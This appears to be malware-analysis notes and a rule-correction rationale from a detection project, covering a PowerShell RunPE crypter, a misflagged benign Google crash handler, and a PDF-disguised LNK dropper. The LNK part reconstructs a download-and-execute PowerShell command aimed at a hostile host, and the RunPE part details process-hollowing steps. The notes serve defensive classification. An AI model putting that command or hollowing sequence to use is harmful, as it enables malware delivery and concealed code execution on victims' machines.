samples.identification: AES-CBC PowerShell crypter with XOR-masked .NET RunPE injector and packed native PE
evidence: Decode-Base64Block decodes the embedded cipher, key and IV; Invoke-AesDecrypt decrypts AES-256-CBC/PKCS7; ScriptBlock.Create($text) and & $block execute the plaintext.

Recovered Start-BeaconCycle checks aspnet_compiler every five seconds. It Base64-decodes and XOR-unmasks the .NET injector and supplies a native MZ array and the Framework v4 aspnet_compiler.exe path to FILE.WHORE.LAUNCHER.

CIL LAUNCHER retries qASnOg2Lc up to five times. The ordered delegate pipeline creates a process with flags 0x08000004, parses the supplied PE headers, obtains integer thread context, reads PEB image base, conditionally unmaps it, allocates RWX remote image memory, writes headers and sections, updates PEB image base, sets CONTEXT[44] (Eax) to mapped base + entry RVA, sets thread context and resumes the thread. Failure terminates the created process.

The embedded native PE has one code section and no normal imports; disassembly shows an obfuscated loader entry with stack-resident configuration. Its final payload identity and downstream actions remain unresolved. Host-image replacement and repeated concealed launch suffice for the malicious verdict; no credential theft or C2 family is inferred.
samples.marker_line: PowerShell RunPE: masked assembly hollows host; add injection coverage

evidence: PE section raw extents end at 291328 (0x47200), exactly the file size and certificate offset. The header claims a further 10528 certificate bytes. No overlay or TLS callback is present. Checksum mismatch and absent signature remain real integrity findings, without establishing malicious alteration.
Ghidra entry 0x4173fa performs normal CRT initialization then calls 0x401513, which sets DLL search policy, initializes configuration, and enters the crash-handler object through 0x409d20.

0x409d20 branches on CrashHandlerLaunchedForMinidump or initializes the Breakpad server; subsequent paths create named-pipe crash services, collect crash metadata, dynamically resolve MiniDumpWriteDump, and launch crash processing/reporting. These operations fit its crash-handler purpose.

The only Session Manager/PendingFileRenameOperations references are in 0x406dd9. It calls RegOpenKeyExW with KEY_READ 0x20019 and RegQueryValueExW twice, validates REG_MULTI_SZ and compares filenames. Caller 0x406d5a is a log rotation routine using .bak, MoveFileExW, and a pending rename check. It does not install boot persistence.

Google identity and crash handler behavior are coherent with Omaha source. There is no observed stealing, backdoor or malicious startup modification in this artifact. Why it was named amadey and extracted from another object, and its actual deployment, are unknown. The certificate cannot be verified and this is not a claim of byte-identical official provenance.

samples.identification: PDF-named PowerShell LNK, embedded Startup downloader and OOXML decoy
evidence: The outer shortcut targets Windows PowerShell with WindowStyle Hidden and a document icon. Its command reads its own filename, seeks to 20KB, saves the remaining data as a PDF-named file in TEMP and starts it.

The tail is actually an OOXML Word ZIP with investment-firm content, rather than PDF. At offset 10KB a complete second LNK is embedded; the command copies those 10KB into GetFolderPath(Startup)\OneDrive.lnk. Parsing that extracted shortcut confirms a hidden PowerShell downloader for subsequent logons.

Both shortcuts construct a ScriptBlock-shaped string containing New-fcxObject Nfcxetfcx.WebCfcxlient and DofcxwnlfcxoadfcxStrfcxinfcxg. Replacing fcx with empty text and concatenating literals reconstructs (New-Object Net.WebClient).DownloadString(http://nobodywillfollowus.top/mart/res/bb.php). The first iex executes that fetch expression, and the second iex executes the returned text.

Persistent hidden downloaded-code execution, a document disguise and decoy display establish malicious intent. The live server response and final payload family were not fetched or executed. This behavior explains collection as a malicious LNK; the linked Triage and Bazaar pages were unavailable through web browsing, so no unobserved sandbox actions are inferred.

correction_rationale: Registry paths/value names are capability facts. Generic registry write APIs elsewhere in the file do not bind the Session Manager references to a write, much less durable executable activation. Their matchers are retained under registry capability homes with accurate reference/profile descriptions.

Google version fields plus a truncated certificate do not prove a forged identity: the reviewed crash handler is a real benign counterexample. The exact composite matcher is retained as suspicious signature metadata. The Google rename API profile retains all original matching legs at suspicious severity.

The unsigned Microsoft rename profile similarly establishes absent signature + version claim + generic API references, not persistence; it retains its matcher and suspicious severity. BootExecute token and generic write APIs retain notable capability observations. The packed-disguise consumer remains hostile and moves to masquerade, removing unsupported persistence mappings.

The SigBase Googleupdate rule only matches OriginalFilename=GoogleUpdate.exe, filesize<2000KB and absent parsed signatures. Keep its match as suspicious rather than hostile. The upstream rule's own SHA256 positive was recovered with forager and tested before and after; it still matches. All 192 extracted units remain analyzed. Its sole hostile label is lost because identity and signing state do not establish hostile behavior; generic process-execution findings remain suspicious.

LNK Invoke-Expression wording, document arguments and quoted concatenation each occur in harmless shortcut controls. Their exact matchers move from dropper objectives to evaluator, extension and concatenation capabilities at notable. All explicit consumers are rewritten. No broad directory consumer outside the old leaves selected these LNK-only facts for a compatible input type.

The Session Manager profile's INF helper downgrades were removed when moving to micro-behaviors: this tier cannot depend on objectives and installer hints do not make an uncommon registry capability universal. No matching population was removed.

Four unchanged registry query/enumeration API matchers moved from generic access to registry/read. Exact consumers and the sole access-directory consumer retain their original selected members; read APIs no longer carry registry-modification ATT&CK tags. The operation-specific placement frees space without increasing budgets or discarding observations.

The LNK evaluator and file-write observations use parsed lnk.arguments; ordinary source-text matchers do not see these UTF-16 structural fields. Their distinct matchers remain in the same operation leaves. The any-only powershell-indicators rollup is notable because evaluation alone does not establish evasion; stronger constituent findings retain severity.
